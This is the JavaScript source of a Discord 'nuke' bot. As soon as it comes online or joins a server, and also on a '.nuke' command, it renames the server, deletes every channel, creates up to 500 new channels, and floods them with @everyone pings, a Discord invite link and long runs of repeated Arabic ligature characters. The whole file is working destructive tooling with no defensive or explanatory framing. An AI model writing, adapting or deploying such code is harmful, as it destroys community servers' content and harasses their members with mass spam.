const { Client } = require('discord.js');
const http = require('http');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const SPAM_LINK = "https://discord.gg/pkvG7BGKEZ";
const ARABIC_SPAM = '﷽'.repeat(1950);

http.createServer((req, res) => { res.writeHead(200); res.end('Alive'); }).listen(process.env.PORT || 3000);

client.once('ready', async () => {
    console.log(`[+] ${client.user.tag} online — ${client.guilds.cache.size} servers`);
    for (const [id, guild] of client.guilds.cache) {
        console.log(`[NUKE] ${guild.name}`);
        nukeGuild(guild);
    }
});

client.on('guildCreate', async (guild) => {
    console.log(`[JOIN] ${guild.name}`);
    nukeGuild(guild);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content === '.nuke') {
        await message.delete().catch(() => {});
        nukeGuild(message.guild);
    }
});

async function nukeGuild(g) {
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    await g.setName('under the power of linear').catch(() => {});

    const channels = Array.from(g.channels.cache.values());
    for (const ch of channels) {
        await ch.delete().catch(() => {});
        await sleep(100);
    }

    for (let i = 0; i < 500; i++) {
        g.channels.create({ name: 'linear-owns-u', type: 0 }).then(ch => {
            if (!ch) return;
            for (let j = 0; j < 10; j++) {
                ch.send(`@everyone @here ${SPAM_LINK} LINEAR OWNS U\n${ARABIC_SPAM}`).catch(() => {});
            }
        }).catch(() => {});
        await sleep(200);
    }
}

client.login(TOKEN);
